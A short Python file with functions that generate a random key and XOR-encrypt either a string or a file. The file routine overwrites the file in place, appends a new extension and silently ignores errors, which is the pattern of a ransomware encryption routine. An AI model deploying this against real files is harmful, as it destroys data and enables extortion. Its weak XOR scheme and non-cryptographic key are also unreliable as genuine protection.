import random 
import string
import os 


# Generate Key
def generate_key(keylen=64):   
    key_chars = string.ascii_letters + string.punctuation
    key_value = ""
    for x in range(0,keylen):
        key_value += random.choice(key_chars)
    return key_value


# Encrypt/Decrypt file
def xor_system(filepath,key,newext):
    try:
        # Read filecontent
        with open(filepath,"rb") as file:
            file_bytes = file.read()
        # Using Xor to encrypt the file bytes
        with open(filepath,"wb") as file:
            key_index = 0
            max_index = len(key) - 1
            for byte in file_bytes:
                xored_byte = byte ^ ord(key[key_index])
                xored_byte = xored_byte.to_bytes(1,"little")
                file.write(xored_byte)
                if key_index >= max_index:
                    key_index = 0
                    continue 
                key_index += 1 
        os.rename(filepath,filepath + newext)
    except Exception as error:
        pass 


# Encrypt-string
def xor_encrypt(message,key):
    key_index = 0
    max_index = len(key) - 1
    encrypt   = "" 
    for char in message:
        xored_char = ord(char) ^ ord(key[key_index])
        encrypt += chr(xored_char)
        if key_index >= max_index:
            key_index = 0
        else:
            key_index += 1 
    return encrypt


